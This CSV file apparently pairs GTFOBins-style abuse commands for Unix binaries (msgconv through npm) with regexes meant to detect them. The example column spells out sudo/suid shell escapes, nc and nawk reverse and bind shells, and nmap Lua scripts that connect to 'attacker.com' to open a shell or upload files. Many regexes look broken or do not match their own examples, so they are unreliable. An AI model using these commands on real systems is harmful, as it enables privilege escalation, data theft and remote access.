Name,Function,ExampleCode,Regex,Notes
msgconv,file-read,msgconv -P $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,sudo,sudo msgconv -P $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,suid,./msgconv -P $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgfilter,shell,echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgfilter,file-read,"msgfilter -P -i ""LFILE"" /bin/cat","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgfilter,sudo,echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgfilter,suid,echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID',"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,file-read,msgmerge -P $LFILE /dev/null,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,sudo,sudo msgmerge -P $LFILE /dev/null,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,suid,./msgmerge -P $LFILE /dev/null,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,file-read,msguniq -P $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,sudo,sudo msguniq -P $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,suid,./msguniq -P $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mtr,file-read,"mtr --raw -F ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mtr\s*\-\-raw\s*\-F\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mtr,sudo,"sudo mtr --raw -F ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mtr\s*\-\-raw\s*\-F\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
multitime,shell,multitime /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?multitime\s+(?:/bin/(?:sh|bash))),
multitime,suid,./multitime /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?multitime\s*\-p\s+(?:/bin/(?:sh|bash))),
multitime,sudo,sudo multitime /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?multitime\s+(?:/bin/(?:sh|bash))),
mv,suid,"echo ""DATA"" > $TF
./mv $TF $LFILE","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mv\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mv,sudo,"echo ""DATA"" > $TF
sudo mv $TF $LFILE","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mv\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mysql,shell,mysql -e '\! /bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,sudo,sudo mysql -e '\! /bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,limited-suid,./mysql -e '\! /bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,library-load,mysql --default-auth ../../../../../path/to/lib,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?mysql\s*\-\-default\-auth\s+.+),
nano,shell,"nano
^R^X
reset; sh 1>&0 2>&0",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nano,shell,"nano -s /bin/sh
/bin/sh
^T",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nano\s*\-s\s+(?:/bin/(?:sh|bash))),
nano,file-write,"nano file_to_write
DATA
^O","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nano\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nano,file-read,nano file_to_read,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nano,limited-suid,"./nano -s /bin/sh
/bin/sh
^T",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nano\s*\-s\s+(?:/bin/(?:sh|bash))),
nano,sudo,"sudo nano
^R^X
reset; sh 1>&0 2>&0",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nasm,file-read,nasm -@ $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nasm,suid,./nasm -@ $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nasm,sudo,sudo nasm -@ $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,shell,"nawk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,non-interactive-reverse-shell,"nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,non-interactive-bind-shell,"nawk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,file-write,"nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,file-read,"nawk '//' ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,suid,"./nawk '//' ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,sudo,"sudo nawk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,limited-suid,"./nawk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,reverse-shell,nc -e /bin/sh $RHOST $RPORT,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,bind-shell,nc -l -p $LPORT -e /bin/sh,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nc\s*\-l\s*\-p\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,file-upload,"nc $RHOST $RPORT < ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,file-download,"nc -l -p $LPORT > ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nc\s*\-l\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,sudo,sudo nc -e /bin/sh $RHOST $RPORT,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,limited-suid,./nc -e /bin/sh $RHOST $RPORT,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ncdu,shell,"ncdu
b",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncdu,sudo,"sudo ncdu
b",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncdu,limited-suid,"./ncdu
b",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncftp,shell,"ncftp
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ncftp\s+(?:/bin/(?:sh|bash))),
ncftp,suid,"./ncftp
!/bin/sh -p",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ncftp\s*\-p\s+(?:/bin/(?:sh|bash))),
ncftp,sudo,"sudo ncftp
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ncftp\s+(?:/bin/(?:sh|bash))),
neofetch,shell,"echo 'exec /bin/sh' >$TF
neofetch --config $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-config\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
neofetch,file-read,neofetch --ascii $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-ascii\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
neofetch,sudo,"echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-config\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,file-read,"nft -f ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,suid,"./nft -f ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,sudo,"sudo nft -f ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nice,shell,nice /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nice\s+(?:/bin/(?:sh|bash))),
nice,suid,./nice /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nice\s*\-p\s+(?:/bin/(?:sh|bash))),
nice,sudo,sudo nice /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nice\s+(?:/bin/(?:sh|bash))),
nl,file-read,nl -bn -w1 -s '' $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nl,suid,./nl -bn -w1 -s '' $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nl,sudo,sudo nl -bn -w1 -s '' $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,file-read,nm @$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,suid,./nm @$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,sudo,sudo nm @$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,shell,"echo 'os.execute(""/bin/sh"")' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,shell,"nmap --interactive
nmap> !sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-interactive\s+.+),
nmap,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,non-interactive-bind-shell,"export LPORT=12345
TF=$(mktemp)
echo 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-upload,"nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-p\s*\-\-script\s*\-\-script\-args\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-download,"nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-p\s*\-\-script\s*\-\-script\-args\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-download,"export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-write,"echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-write,nmap -oG=$LFILE DATA,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-read,"echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF
nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-read,nmap -iL file_to_read,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s+.+),
nmap,sudo,"echo 'os.execute(""/bin/sh"")' > $TF
sudo nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,sudo,"sudo nmap --interactive
nmap> !sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-interactive\s+.+),
nmap,limited-suid,"echo 'os.execute(""/bin/sh"")' > $TF
./nmap --script=$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,suid,./nmap -oG=$LFILE DATA,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nmap\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nohup,shell,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+(?:/bin/(?:sh|bash))),
nohup,command,"nohup ""$COMMAND""
cat nohup.out","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nohup\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nohup,suid,"./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nohup\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
nohup,sudo,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+(?:/bin/(?:sh|bash))),
npm,shell,npm exec /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?npm\s+(?:/bin/(?:sh|bash))),
